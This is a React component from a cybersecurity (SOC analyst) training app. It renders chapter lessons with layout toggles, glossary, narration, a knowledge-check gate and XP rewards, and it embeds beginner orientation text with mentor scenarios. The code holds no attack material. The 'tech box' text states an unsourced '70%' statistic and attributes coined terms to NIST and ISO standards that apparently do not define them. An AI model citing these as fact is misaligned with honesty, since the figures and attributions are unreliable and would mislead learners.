'use client';

import React, { useState, useEffect, useRef } from 'react';
import {
  Award,
  CheckCircle2,
  Check,
  ChevronRight,
  ChevronLeft,
  ChevronDown,
  ChevronUp,
  UserCheck,
  RotateCcw,
  Shield,
  Play,
  Pause,
  ExternalLink,
  Edit3,
  Lightbulb,
  Sparkles,
  BookOpen,
  ArrowRight,
  Activity,
  Layers,
  Terminal,
  Compass,
  Zap,
  Users,
  Monitor,
  Server,
  Box,
  Eye,
  EyeOff,
  Maximize2,
  Columns,
  BookMarked,
  Lock,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import {
  V2Chapter,
  V2ChapterNormalized,
  V2Unit,
  V2Module,
  normalizeV2Chapter,
  ExtraBox,
  FormalDefinition,
  QuestionItem,
  QuestionType,
  TerminologyScaffolding,
  InstructionalConceptContext,
} from '@/data/curriculum-v2-data';
import { AdminChapterEditorModal } from './admin-chapter-editor-modal';
import {
  InteractiveVisualStoryEngine,
  VisualStoryStyle,
  VisualNodeItem,
} from './interactive-visual-story-engine';
import { useProgressStore } from '@/store/progress-store';
import { useGlossaryStore } from '@/store/glossary-store';
import { resolveChapterGlossaryTerms } from '@/lib/chapter-glossary-helper';
import { useToast } from '@/components/ui/toast-provider';
import { sound } from '@/lib/sound-effects';
import { BlueGuyCharacter } from '@/components/learning/blue-guys/blue-guy-character';
import { GlossaryText } from '@/components/learning/glossary-term-link';


interface ChapterV2ViewProps {
  module: V2Module;
  unit: V2Unit;
  initialChapter: V2Chapter;
  isAdmin?: boolean;
  onNext?: () => void;
  onCompleteChapter?: (chapterId: string, xp: number) => void;
}

export function ChapterV2View({
  module,
  unit,
  initialChapter,
  isAdmin = false,
  onNext,
  onCompleteChapter,
}: ChapterV2ViewProps) {
  const [chapter, setChapter] = useState<V2ChapterNormalized>(() =>
    normalizeV2Chapter(initialChapter, unit, module)
  );
  const [isEditorOpen, setIsEditorOpen] = useState(false);

  // View Layout Mode: 'stacked' (all 3 pillar boxes 1 by 1 down) or 'tabbed' (focus one at a time)
  const [layoutMode, setLayoutMode] = useState<'stacked' | 'tabbed'>('stacked');
  const [activeTabIdx, setActiveTabIdx] = useState<number>(0);

  // Pillar Display Mode: 'focused' (explanation pushed upward at full size, full-width graphic below) or 'split' (side-by-side 50/50)
  const [viewLayout, setViewLayout] = useState<'focused' | 'split'>('focused');
  // Per-pillar layout override state ('focused' | 'split')
  const [pillarLayoutOverrides, setPillarLayoutOverrides] = useState<Record<number, 'focused' | 'split'>>({});

  // Sync layout mode with floating SectionSidebarLine
  useEffect(() => {
    window.dispatchEvent(new CustomEvent('soc:view-layout-changed', { detail: { mode: viewLayout } }));
  }, [viewLayout]);

  useEffect(() => {
    const handleSetViewLayout = (e: any) => {
      const mode = e.detail?.mode;
      if (mode === 'focused' || mode === 'split') {
        setViewLayout(mode);
        setPillarLayoutOverrides({});
        if (mode === 'focused') {
          setLayoutMode('tabbed');
        }
      }
    };
    window.addEventListener('soc:set-view-layout', handleSetViewLayout);
    return () => window.removeEventListener('soc:set-view-layout', handleSetViewLayout);
  }, []);

  // Tech Box dropdown state per pillar
  const [openTechBoxes, setOpenTechBoxes] = useState<Record<number, boolean>>({
    0: false,
    1: false,
    2: false,
  });

  // Floating Glossary integration: resolve & prioritize chapter-relevant terms
  const openGlossary = useGlossaryStore((s) => s.openGlossary);
  const setCurrentTopicTerms = useGlossaryStore((s) => s.setCurrentTopicTerms);

  const currentChapterTerms = React.useMemo(() => {
    return resolveChapterGlossaryTerms({
      moduleId: module.id,
      chapterId: chapter.id,
      chapterTitle: chapter.title,
      unitTitle: unit.title,
      pillarHeadings: [
        chapter.section1_theory?.title,
        chapter.section2_visual?.title,
        chapter.section3_interactive?.title,
        chapter.section1_theory?.keyTakeaway,
      ].filter(Boolean) as string[],
      techBoxTitles: [
        chapter.section1_theory?.terminologyScaffolding?.concept,
        ...(chapter.section1_theory?.formalDefinitions?.map((f) => f.term) || []),
      ].filter(Boolean) as string[],
    });
  }, [
    module.id,
    chapter.id,
    chapter.title,
    unit.title,
    chapter.section1_theory?.title,
    chapter.section2_visual?.title,
    chapter.section3_interactive?.title,
    chapter.section1_theory?.keyTakeaway,
    chapter.section1_theory?.terminologyScaffolding?.concept,
    chapter.section1_theory?.formalDefinitions,
  ]);

  useEffect(() => {
    if (currentChapterTerms && currentChapterTerms.length > 0) {
      setCurrentTopicTerms(currentChapterTerms);
    }
  }, [currentChapterTerms, setCurrentTopicTerms]);


  const getDefaultNodesForChapter = (chapterId: string): Record<number, string> => {
    // Module 00: Course Orientation & Primer
    if (chapterId === 'M00-U1-C1') return { 0: 'rec-campus', 1: 'rule-pause', 2: 'base-ordinary' };
    if (chapterId === 'M00-U1-C2') return { 0: 'zone-soc', 1: 'demarc-soc-does', 2: 'route-alert-3am' };
    if (chapterId === 'M00-U2-C1') return { 0: 'border-blue', 1: 'vm-host-only', 2: 'snap-revert' };
    if (chapterId === 'M00-U2-C2') return { 0: 'evid-hash', 1: 'copy-duplicate', 2: 'pause-halt' };
    if (chapterId === 'M00-U3-C1') return { 0: 'svc-overview', 1: 'ent-account', 2: 'obs-disciplined' };
    if (chapterId === 'M00-U3-C2') return { 0: 'road-foundations', 1: 'sec1-theory', 2: 'scaf-autonomous' };
    // Module 01: Host System Fundamentals
    if (chapterId === 'M01-U1-C1') return { 0: 'hw-cpu', 1: 'kern-coord', 2: 'user-std' };
    if (chapterId === 'M01-U1-C2') return { 0: 'fs-sys32', 1: 'proc-explorer', 2: 'mem-excel' };
    if (chapterId === 'M01-U2-C1') return { 0: 'cli-tasklist', 1: 'triage-suspicious', 2: 'sock-local' };
    if (chapterId === 'M01-U2-C2') return { 0: 'log-eventid', 1: 'vault-sec', 2: 'fwd-wef' };
    if (chapterId === 'M01-U3-C1') return { 0: 'net-mac', 1: 'tcp-syn', 2: 'cs-dns' };
    if (chapterId === 'M01-U3-C2') return { 0: 'base-hours', 1: 'anom-lolbin', 2: 'tri-alert' };
    // Module 02: Networking Fundamentals
    if (chapterId === 'M02-U1-C1') return { 0: 'sub-netbits', 1: 'gw-host', 2: 'nat-private' };
    if (chapterId === 'M02-U1-C2') return { 0: 'ap-client', 1: 'cam-port1', 2: 'rtr-ingress' };
    if (chapterId === 'M02-U2-C1') return { 0: 'dhcp-discover', 1: 'dns-client', 2: 'dns-benign' };
    if (chapterId === 'M02-U2-C2') return { 0: 'door-443', 1: 'tcp-established', 2: 'race-tcp' };
    if (chapterId === 'M02-U3-C1') return { 0: 'br-workstation', 1: 'fw-rule1', 2: 'chk-netallow' };
    if (chapterId === 'M02-U3-C2') return { 0: 'vlan-staff', 1: 'trunk-dot1q', 2: 'audit-block' };
    // Module 03: Cybersecurity Fundamentals
    if (chapterId === 'M03-U1-C1') return { 0: 'asset-crown', 1: 'tv-threat', 2: 'ent-person' };
    if (chapterId === 'M03-U1-C2') return { 0: 'cia-conf', 1: 'risk-mat-high', 2: 'bia-kiosk' };
    if (chapterId === 'M03-U2-C1') return { 0: 'phish-sender', 1: 'cred-spray', 2: 'mfa-bomb' };
    if (chapterId === 'M03-U2-C2') return { 0: 'mal-ransom', 1: 'insider-bulk', 2: 'scan-syn' };
    if (chapterId === 'M03-U3-C1') return { 0: 'ctrl-prev', 1: 'ir-contain', 2: 'act-alert' };
    if (chapterId === 'M03-U3-C2') return { 0: 'did-perimeter', 1: 'blast-user', 2: 'zt-verify' };
    // Module 04: SOC Operations & Alert Triage
    if (chapterId === 'M04-U1-C1') return { 0: 'tier-l1', 1: 'esc-boundary', 2: 'shift-day' };
    if (chapterId === 'M04-U1-C2') return { 0: 'queue-sev1', 1: 'life-new', 2: 'sla-mttd' };
    if (chapterId === 'M04-U2-C1') return { 0: 'eva-event', 1: 'rule-eventid', 2: 'trap-title' };
    if (chapterId === 'M04-U2-C2') return { 0: 'quad-event', 1: 'agg-alert1', 2: 'vault-hashes' };
    if (chapterId === 'M04-U3-C1') return { 0: 'five-who', 1: 'agg-count-raw', 2: 'hon-why-unknown' };
    if (chapterId === 'M04-U3-C2') return { 0: 'disp-tp-mal', 1: 'hand-summary', 2: 'pkg-bundle' };
    // Module 05: SIEM Fundamentals & Search
    if (chapterId === 'M05-U1-C1') return { 0: 'cap-aggregate', 1: 'gap-covered', 2: 'doc-empty-search' };
    if (chapterId === 'M05-U1-C2') return { 0: 'src-sysmon', 1: 'pipe-source', 2: 'hlth-active' };
    if (chapterId === 'M05-U2-C1') return { 0: 'fld-timestamp', 1: 'time-window-15m', 2: 'chk-timerange' };
    if (chapterId === 'M05-U2-C2') return { 0: 'gate-and', 1: 'kql-kibana', 2: 'dos-query-save' };
    if (chapterId === 'M05-U3-C1') return { 0: 'eng-join', 1: 'rule-stream', 2: 'tune-thresh-optimal' };
    if (chapterId === 'M05-U3-C2') return { 0: 'mos-identity', 1: 'min-approved-fields', 2: 'pkt-bundle' };
    // Module 06: Log & Event Analysis
    if (chapterId === 'M06-U1-C1') return { 0: 'lit-raw-text', 1: 'ts-generation', 2: 'out-failure-eval' };
    if (chapterId === 'M06-U1-C2') return { 0: 'pipe-raw-unparsed', 1: 'map-windows-user', 2: 'raw-parser-bug' };
    if (chapterId === 'M06-U2-C1') return { 0: 'utc-master-clock', 1: 'roll-ist-oct15', 2: 'off-missing-zone' };
    if (chapterId === 'M06-U2-C2') return { 0: 'id-mac-hardware', 1: 'lease-active-window', 2: 'coin-same-minute' };
    if (chapterId === 'M06-U3-C1') return { 0: 'cor-corroborated', 1: 'blk-evidence-hole', 2: 'echo-single-source' };
    if (chapterId === 'M06-U3-C2') return { 0: 'ledg-observed-fact', 1: 'pres-fail-sequence', 2: 'note-precise-unknown' };
    // Module 07: Windows & Linux Security Monitoring
    if (chapterId === 'M07-U1-C1') return { 0: 'chan-security-evtx', 1: 'sign-naked-id', 2: 'integ-sys-104' };
    if (chapterId === 'M07-U1-C2') return { 0: 'logon-type-2', 1: 'priv-4672-event', 2: 'ident-cred-success' };
    if (chapterId === 'M07-U2-C1') return { 0: 'geo-auth-log', 1: 'ssh-failed-pw', 2: 'brute-fail-volume' };
    if (chapterId === 'M07-U2-C2') return { 0: 'srv-systemd-pid1', 1: 'sudo-caller-user', 2: 'vis-default-shell-gap' };
    if (chapterId === 'M07-U3-C1') return { 0: 'base-operating-hours', 1: 'svc7045-system-log', 2: 'ctx-unexplained-install' };
    if (chapterId === 'M07-U3-C2') return { 0: 'host-verified-links', 1: 'comm-playbook-rules', 2: 'summ-host-id-check' };
    // Module 08: Network Security Monitoring
    if (chapterId === 'M08-U1-C1') return { 0: 'pcap-raw-packet', 1: 'scope-network-tap', 2: 'seg-monitored-zone' };
    if (chapterId === 'M08-U1-C2') return { 0: 'tls-client-hello', 1: 'dns-query-packet', 2: 'trap-metadata-fact' };
    if (chapterId === 'M08-U2-C1') return { 0: 'ws-packet-list', 1: 'filt-capture-bpf', 2: 'rep-filter-syntax' };
    if (chapterId === 'M08-U2-C2') return { 0: 'scan-syn-sequence', 1: 'beac-regular-delta', 2: 'doc-unsupported-label' };
    if (chapterId === 'M08-U3-C1') return { 0: 'nat-internal-socket', 1: 'prx-client-request', 2: 'attr-resolved-match' };
    if (chapterId === 'M08-U3-C2') return { 0: 'obj-export-feature', 1: 'dist-capture-mass', 2: 'dos-evidence-anchors' };
    // Module 09: Endpoint Detection & Response (EDR)
    if (chapterId === 'M09-U1-C1') return { 0: 'edr-device-online', 1: 'stale-offline-status', 2: 'funnel-process-events' };
    if (chapterId === 'M09-U1-C2') return { 0: 'av-signature-engine', 1: 'overlap-prevention', 2: 'limits-lolbin-blindness' };
    if (chapterId === 'M09-U2-C1') return { 0: 'proc-root-explorer', 1: 'cmdline-binary-path', 2: 'file-homograph-name' };
    if (chapterId === 'M09-U2-C2') return { 0: 'time-activity-local', 1: 'fallacy-event-a', 2: 'align-track-endpoint' };
    if (chapterId === 'M09-U3-C1') return { 0: 'reputation-file-hash', 1: 'unknown-feed-verdict', 2: 'playbook-unilateral-risk' };
    if (chapterId === 'M09-U3-C2') return { 0: 'gate-target-verification', 1: 'iso-connected-state', 2: 'audit-target-record' };
    // Module 10: Security Ecosystem: XDR, Response Tools & OT/ICS
    if (chapterId === 'M10-U1-C1') return { 0: 'wb-case-record', 1: 'xdr-env-truth', 2: 'custody-ownership' };
    if (chapterId === 'M10-U1-C2') return { 0: 'soar-ingest-trigger', 1: 'cap-api-capability', 2: 'guard-blocklist' };
    if (chapterId === 'M10-U2-C1') return { 0: 'otit-it-priority', 1: 'ics-pressure-sensor', 2: 'peril-it-reboot' };
    if (chapterId === 'M10-U2-C2') return { 0: 'purdue-l4-enterprise', 1: 'seg-corporate-access', 2: 'pas-optical-tap' };
    if (chapterId === 'M10-U3-C1') return { 0: 'resp-block-ip', 1: 'side-shared-ip', 2: 'rev-interruption-cost' };
    if (chapterId === 'M10-U3-C2') return { 0: 'ro-alert-trigger', 1: 'anti-case-881-facts', 2: 'esc-asset-manifest' };
    // Module 11: Identity, Email & Threat Intelligence
    if (chapterId === 'M11-U1-C1') return { 0: 'sign-account-id', 1: 'mfa-factor-eval', 2: 'geo-ip-label' };
    if (chapterId === 'M11-U1-C2') return { 0: 'priv-standard-user', 1: 'imp-standard-valuable', 2: 'dir-ldap-record' };
    if (chapterId === 'M11-U2-C1') return { 0: 'art-preserved-eml', 1: 'link-visible-anchor', 2: 'auth-spf-breakdown' };
    if (chapterId === 'M11-U2-C2') return { 0: 'quar-vault-isolation', 1: 'leak-internal-confidential', 2: 'att-hash-sha256' };
    if (chapterId === 'M11-U3-C1') return { 0: 'pyr-trivial-hashes', 1: 'fresh-active-c2', 2: 'note-provenance-source' };
    if (chapterId === 'M11-U3-C2') return { 0: 'cor-verified-solid', 1: 'trap-shared-cdn-ip', 2: 'dos-no-hit-doctrine' };
    // Module 12: SOAR & Basic SOC Automation
    if (chapterId === 'M12-U1-C1') return { 0: 'pb-trigger-node', 1: 'val-raw-payload', 2: 'bra-condition-eval' };
    if (chapterId === 'M12-U1-C2') return { 0: 'enr-ingest-alert', 1: 'not-draft-docket', 2: 'std-provenance-source' };
    if (chapterId === 'M12-U2-C1') return { 0: 'gate-enrich-complete', 1: 'scope-target-binding', 2: 'time-window-timer' };
    if (chapterId === 'M12-U2-C2') return { 0: 'conn-http-504', 1: 'ret-attempt-one', 2: 'aud-step-telemetry' };
    if (chapterId === 'M12-U3-C1') return { 0: 'rev-triad-target', 1: 'mis-script-defect', 2: 'pln-rollback-script' };
    if (chapterId === 'M12-U3-C2') return { 0: 'red-domain-controller', 1: 'ded-burst-ingest', 2: 'mas-test-matrix' };
    // Module 13: MITRE ATT&CK for L1 Analysts
    if (chapterId === 'M13-U1-C1') return { 0: 'ttp-tactic-objective', 1: 'mat-tactics-progression', 2: 'voc-vendor-alarm-chaos' };
    if (chapterId === 'M13-U1-C2') return { 0: 'des-observed-mechanic', 1: 'obs-raw-command-event', 2: 'lol-dual-use-binary' };
    if (chapterId === 'M13-U2-C1') return { 0: 'crd-lsass-memory-dump', 1: 'dsc-account-discovery', 2: 'brg-discovery-recon' };
    if (chapterId === 'M13-U2-C2') return { 0: 'spc-vague-parent-technique', 1: 'plu-grounded-observable', 2: 'thr-process-path-gate' };
    if (chapterId === 'M13-U3-C1') return { 0: 'anc-technique-tag', 1: 'unc-confirmed-high', 2: 'doc-docket-header' };
    if (chapterId === 'M13-U3-C2') return { 0: 'lep-single-observation', 1: 'sod-solid-verified-link', 2: 'mas-ttp-taxonomy-mastery' };
    // Module 14: Incident Response & SOC Documentation
    if (chapterId === 'M14-U1-C1') return { 0: 'ir-prep-phase', 1: 'det-alert-ingest', 2: 'prf-clock-sync' };
    if (chapterId === 'M14-U1-C2') return { 0: 'bnd-tier-l1', 1: 'trg-tier0-asset', 2: 'epd-volatile-ram' };
    if (chapterId === 'M14-U2-C1') return { 0: 'tml-zeek-beacon', 1: 'not-who-entity', 2: 'fvi-verified-fact' };
    if (chapterId === 'M14-U2-C2') return { 0: 'sev-critical-sev1', 1: 'cnf-single-source', 2: 'dsp-true-positive-mal' };
    if (chapterId === 'M14-U3-C1') return { 0: 'esc-l1-triage', 1: 'own-ticket-staging', 2: 'oob-inband-danger' };
    if (chapterId === 'M14-U3-C2') return { 0: 'shf-active-cases', 1: 'lrn-root-cause', 2: 'mas-ir-lifecycle' };
    return { 0: 'hw-cpu', 1: 'kern-coord', 2: 'user-std' };
  };

  // Selected node states per pillar
  const [selectedPillarNodes, setSelectedPillarNodes] = useState<Record<number, string>>(() =>
    getDefaultNodesForChapter(initialChapter?.id || 'M01-U1-C1')
  );

  // Audio narration state
  const [isPlayingAudio, setIsPlayingAudio] = useState<boolean>(false);
  const audioRef = useRef<HTMLAudioElement | null>(null);

  // Knowledge Check State (Separate section)
  const [isKCOpen, setIsKCOpen] = useState<boolean>(false);
  const [selectedAnswers, setSelectedAnswers] = useState<Record<number, any>>({});
  const [inputAnswers, setInputAnswers] = useState<Record<number, string>>({});
  const [quizSubmitted, setQuizSubmitted] = useState<boolean>(false);
  const [isCompleted, setIsCompleted] = useState<boolean>(false);

  const { showToast } = useToast();
  const markUnitComplete = useProgressStore((s) => s.markUnitComplete);
  const completedTopics = useProgressStore((s) => s.completedTopics);
  const completeTopic = useProgressStore((s) => s.completeTopic);

  // Interaction tracking across all 3 pillars
  const [interactedPillars, setInteractedPillars] = useState<Set<number>>(() => {
    return completedTopics.has(initialChapter?.id) ? new Set([0, 1, 2]) : new Set([0]);
  });

  const markPillarInteracted = (pillarIndex: number) => {
    setInteractedPillars((prev) => {
      const next = new Set(prev);
      next.add(pillarIndex);
      return next;
    });
  };

  const isTopicAlreadyDone = completedTopics.has(chapter.id);
  const isKCCleared =
    isTopicAlreadyDone ||
    (quizSubmitted && selectedAnswers[0] === chapter.section4_knowledgeCheck.questions[0]?.correctAnswer);

  const canAdvance = isTopicAlreadyDone || (interactedPillars.size >= 3 && isKCCleared);

  const missingRequirements = React.useMemo(() => {
    const list: string[] = [];
    if (!isTopicAlreadyDone) {
      if (interactedPillars.size < 3) {
        list.push(`Interact with all 3 Visual Story pillars (${interactedPillars.size}/3 interacted)`);
      }
      if (!isKCCleared) {
        list.push('Complete and pass the Knowledge Check question at the bottom');
      }
    }
    return list;
  }, [isTopicAlreadyDone, interactedPillars.size, isKCCleared]);

  // Broadcast lock status to parent module-details-view
  useEffect(() => {
    window.dispatchEvent(
      new CustomEvent('soc:chapter-lock-status', {
        detail: {
          chapterId: chapter.id,
          canAdvance,
          missingRequirements,
          interactedPillarsCount: interactedPillars.size,
          isKCCleared,
        },
      })
    );
  }, [chapter.id, canAdvance, missingRequirements, interactedPillars.size, isKCCleared]);

  // Chapter navigation sync
  const currentChapterId = initialChapter?.id;
  const prevChapterIdRef = useRef(currentChapterId);

  useEffect(() => {
    if (prevChapterIdRef.current !== currentChapterId) {
      prevChapterIdRef.current = currentChapterId;
      setChapter(normalizeV2Chapter(initialChapter, unit, module));
      setSelectedAnswers({});
      setInputAnswers({});
      setQuizSubmitted(false);
      setIsCompleted(false);
      setActiveTabIdx(0);
      setOpenTechBoxes({ 0: false, 1: false, 2: false });
      setSelectedPillarNodes(getDefaultNodesForChapter(currentChapterId || 'M01-U1-C1'));
      setInteractedPillars(completedTopics.has(currentChapterId || '') ? new Set([0, 1, 2]) : new Set([0]));

      if (audioRef.current) {
        audioRef.current.pause();
      }
      if ('speechSynthesis' in window && window.speechSynthesis.speaking) {
        window.speechSynthesis.cancel();
      }
      setIsPlayingAudio(false);
    }
  }, [currentChapterId, initialChapter, unit, module, completedTopics]);

  // Audio Narration Toggle
  const toggleAudioNarration = () => {
    const audioUrl = chapter.section1_theory.audioUrl || chapter.section2_visual.audioUrl;
    const mentorName = chapter.section1_theory.mentor || chapter.mentor || 'Ravi';
    const speechText =
      chapter.section1_theory.terminologyScaffolding?.analogy ||
      chapter.section1_theory.cdacScenario ||
      chapter.section1_theory.subtitle ||
      chapter.title;

    if (!audioUrl) {
      if ('speechSynthesis' in window) {
        if (window.speechSynthesis.speaking) {
          window.speechSynthesis.cancel();
          setIsPlayingAudio(false);
        } else {
          const text = `${chapter.title}. Mentor ${mentorName} explains: ${speechText}`;
          const utterance = new SpeechSynthesisUtterance(text);
          utterance.rate = 0.95;
          utterance.onend = () => setIsPlayingAudio(false);
          utterance.onerror = () => setIsPlayingAudio(false);
          window.speechSynthesis.speak(utterance);
          setIsPlayingAudio(true);
        }
      } else {
        showToast({
          type: 'info',
          title: 'Narration Audio',
          description: 'Audio speech synthesis is not supported on this device.',
        });
      }
      return;
    }

    if (!audioRef.current) {
      audioRef.current = new Audio(audioUrl);
      audioRef.current.onended = () => setIsPlayingAudio(false);
    }

    if (isPlayingAudio) {
      audioRef.current.pause();
      setIsPlayingAudio(false);
    } else {
      audioRef.current.play().catch(() => {});
      setIsPlayingAudio(true);
    }
  };

  // Finish Chapter & Earn XP (Enforces interaction with all 3 pillars + KC clearance)
  const handleFinishChapter = () => {
    if (!canAdvance) {
      sound.playClick();
      showToast({
        type: 'warning',
        title: 'Chapter Locked 🔒',
        description: `Please complete the following before advancing:\n• ${missingRequirements.join('\n• ')}`,
      });

      // Priority 1: If there are unvisited slides, switch and scroll directly to them
      const unvisited = [0, 1, 2].find((idx) => !interactedPillars.has(idx));
      if (unvisited !== undefined) {
        window.dispatchEvent(new CustomEvent('soc:set-slide', { detail: { index: unvisited } }));
        setTimeout(() => {
          const el = document.getElementById(`pillar-box-${unvisited}`) || document.getElementById('section-interactive');
          if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }, 80);
      } else if (!isKCCleared) {
        // Priority 2: Knowledge Check not cleared
        setIsKCOpen(true);
        setTimeout(() => {
          const kcEl = document.getElementById('section-kc') || document.querySelector('.knowledge-check-section');
          if (kcEl) kcEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }, 80);
      }
      return;
    }

    sound.playSuccess();
    setIsCompleted(true);
    completeTopic(chapter.id);
    markUnitComplete(unit.id);
    if (onCompleteChapter) {
      onCompleteChapter(chapter.id, chapter.xpReward);
    }
    showToast({
      type: 'success',
      title: `Chapter Completed! 🎉 (+${chapter.xpReward} XP)`,
      description: `Great job! You mastered "${chapter.title}".`,
    });
    if (onNext) {
      setTimeout(() => onNext(), 700);
    }
  };

  const scaffolding = chapter.section1_theory.terminologyScaffolding;
  const modId = module?.id || '';
  const chId = chapter.id;

  // ---------------------------------------------------------------------------
  // DYNAMIC 3 PILLAR SCENARIOS TAILORED FOR EACH CHAPTER
  // ---------------------------------------------------------------------------
  const getPillarsForChapter = () => {
    // =========================================================================
    // MODULE 00: ORIENTATION - YOUR FIRST SOC SHIFT
    // =========================================================================

    // 1. M00-U1-C1: A visitor, not yet an analyst
    if (chId === 'M00-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ARRIVAL',
          subPillar: 'CDAC BENGALURU RECEPTION',
          heading: 'Morning Arrival: Stepping onto the CDAC Bengaluru Campus',
          paragraph1:
            'Morning sunlight falls across the CDAC Bengaluru cybersecurity training campus as you step through the reception doors. Mentor Ananya greets you warmly: "Welcome. You do not need an IT background, and nobody expects you to investigate an attack today."',
          paragraph2:
            'You receive an orientation badge reading "SOC Learner". You use phones and laptops every day, but today you begin understanding ordinary computer activity first so you can later spot what needs checking.',
          techBoxTitle: 'TECH BOX: The Learning Campus & Apprentice Posture [Details]',
          techBoxAnalogy:
            'Like a flight school student visiting the hangar on day one: you don\'t fly the Boeing 747 in a thunderstorm; you first learn where the instruments are and how clear skies look.',
          techBoxDef:
            'Apprentice Orientation Posture (NIST NICE SP 800-181) establishes foundational operational readiness through safe observation and mentor-guided exploration before engaging live telemetry.',
          techBoxWhy:
            'Eliminates learner anxiety and grounds novice defenders in safe habits before interacting with complex enterprise SIEM and EDR consoles.',
          defaultAnimation: 'm00-campus-reception' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'rec-campus', label: 'CAMPUS' },
            { id: 'rec-visitor', label: 'LEARNER' },
            { id: 'rec-mentor', label: 'ANANYA' },
            { id: 'rec-badge', label: 'BADGE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DOCTRINE',
          subPillar: 'THE FIRST CARDINAL RULE',
          heading: 'The Cardinal Rule: Ask Before Changing Anything',
          paragraph1:
            'Beginners often fear making mistakes or feel pressured to click buttons hastily when an unfamiliar prompt or alert sounds. Mentor Ananya establishes our foundational rule right away: "First question: if a screen shows something unfamiliar, should you guess, change it, or ask for help?"',
          paragraph2:
            'The only professional response is: "Ask for help before changing anything." Curiosity is welcome; unsupported action is not. Never guess when encountering unfamiliar activity.',
          techBoxTitle: 'TECH BOX: Disciplined Restraint & Safe Escalation [Details]',
          techBoxAnalogy:
            'Like an unexploded ordnance technician: if you encounter an unknown wire, you never cut it on a hunch—you pause, document the markings, and call the lead ordnance officer.',
          techBoxDef:
            'Disciplined Restraint (CDAC-SOP-L1-01) dictates that an apprentice analyst must freeze execution and consult senior leads whenever an action carries uncertainty or risk of data destruction.',
          techBoxWhy:
            'Over 70% of beginner security incidents are made worse by hasty, unauthorized changes that wipe volatile memory evidence before forensically captured.',
          defaultAnimation: 'm00-cardinal-rule' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'rule-unfamiliar', label: 'PROMPT' },
            { id: 'rule-hasty', label: 'GUESS ✕' },
            { id: 'rule-pause', label: 'PAUSE ✓' },
            { id: 'rule-ask', label: 'CONSULT' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: BASELINE',
          subPillar: 'OPERATIONAL BASELINE',
          heading: 'Understanding Ordinary Activity Before Hunting Anomalies',
          paragraph1:
            'You cannot spot an anomaly without knowing what normal looks like. In cybersecurity, defenders call this the "operational baseline." Before opening complex security consoles, we first understand how computers boot up, how files are stored, and how standard office users sign in.',
          paragraph2:
            'When disciplined analysts encounter strange behavior, they do not jump to speculative guesses—they observe verifiable facts, record timestamps, and measure deviations against documented baselines.',
          techBoxTitle: 'TECH BOX: Operational Baselines & Anomaly Gates [Details]',
          techBoxAnalogy:
            'Like a doctor checking a patient: you must know normal resting body temperature (37°C / 98.6°F) and pulse before diagnosing a fever or infection.',
          techBoxDef:
            'Operational Baseline (NIST SP 800-137) is a documented set of normal operational activity patterns against which subsequent telemetry deviations are compared.',
          techBoxWhy:
            'Prevents false positive alert fatigue and enables precision detection of subtle adversary intrusions disguised as normal business tasks.',
          defaultAnimation: 'm00-operational-baseline' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'base-ordinary', label: 'NORMAL' },
            { id: 'base-observe', label: 'OBSERVE' },
            { id: 'base-verify', label: 'VERIFY' },
            { id: 'base-anomaly', label: 'ANOMALY ▲' },
          ],
        },
      ];
    }

    // 2. M00-U1-C2: The centre and its people
    if (chId === 'M00-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ZONES',
          subPillar: 'THE 6 CAMPUS TEACHING ZONES',
          heading: 'The 6 Teaching Zones: Division of Responsibility',
          paragraph1:
            'Mentor Ananya brings up an illustrated campus map highlighting six distinct teaching zones: Staff Support, Computing & Workstations, Network Services, Identity Services, Security Monitoring (SOC), and Response Coordination.',
          paragraph2:
            'Each zone specializes in dedicated enterprise domains. Ananya clarifies: "These are teaching zones illustrating organizational division of labor—not a claim about a single monolithic team."',
          techBoxTitle: 'TECH BOX: Enterprise IT Service Demarcation [Details]',
          techBoxAnalogy:
            'Like a hospital: the radiology lab takes X-rays, the pharmacy dispenses medicine, the ICU provides emergency care, and security monitors the perimeter.',
          techBoxDef:
            'Service Owner Architecture (ISO/IEC 20000-1) establishes formal accountability for specific IT domains, ensuring clean boundaries between infrastructure, identity, and security.',
          techBoxWhy:
            'Prevents operational chaos by routing tickets directly to specialized domain owners rather than bottlenecking all requests at the security operations center.',
          defaultAnimation: 'm00-teaching-zones-map' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'zone-support', label: 'SUPPORT' },
            { id: 'zone-computing', label: 'COMPUTING' },
            { id: 'zone-network', label: 'NETWORK' },
            { id: 'zone-identity', label: 'IDENTITY' },
            { id: 'zone-soc', label: 'SOC' },
            { id: 'zone-response', label: 'RESPONSE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: BOUNDARIES',
          subPillar: 'WHAT THE SOC DOES VS DOES NOT',
          heading: 'SOC Demarcation: Monitoring vs Service Ownership',
          paragraph1:
            'A common beginner misconception is that cybersecurity analysts control every computer, replace broken hardware, and rewrite enterprise software. Ananya clarifies firmly: "No. The SOC monitors security telemetry and coordinates with the people who own devices, accounts, networks, and services."',
          paragraph2:
            'The SOC functions as an independent watchtower. It investigates security alerts, correlates telemetry streams, and preserves evidence while keeping system owners informed throughout investigations.',
          techBoxTitle: 'TECH BOX: Role Demarcation & Neutral Oversight [Details]',
          techBoxAnalogy:
            'Like bank security guards: guards watch security monitors and investigate vault alarms; they do not count cash in the tellers drawers or approve home loan applications.',
          techBoxDef:
            'Role Demarcation (NIST SP 800-53 AC-5) requires separation of duties between security monitoring personnel and system administrators to maintain objective audit integrity.',
          techBoxWhy:
            'Ensures security analysts can objectively audit administrative actions without conflict of interest or responsibility for day-to-day IT maintenance.',
          defaultAnimation: 'm00-soc-demarcation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'demarc-soc-does', label: 'SOC ROLE' },
            { id: 'demarc-coord', label: 'COORDINATE' },
            { id: 'demarc-not-helpdesk', label: 'NOT HELPDESK' },
            { id: 'demarc-not-admin', label: 'NOT ADMIN' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: ROUTING',
          subPillar: 'CROSS-FUNCTIONAL TICKET ROUTING',
